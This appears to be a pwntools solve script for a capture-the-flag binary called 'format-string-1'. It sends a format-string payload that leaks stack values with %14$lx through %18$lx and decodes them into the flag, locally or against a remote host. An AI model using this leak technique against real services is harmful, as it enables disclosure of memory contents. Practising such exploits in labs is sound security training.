from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./format-string-1"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "warn"
# context.terminal = "kitty"

io = start()

payload = b"".join([f"%{i}$lx.".encode() for i in range(14, 19)])
io.sendlineafter(b"you:\n", payload)
io.recvuntil(b"order: ")
flag = "".join(
    [bytes.fromhex(i)[::-1].decode() for i in io.recvline().decode().split(".")]
)

print(flag)
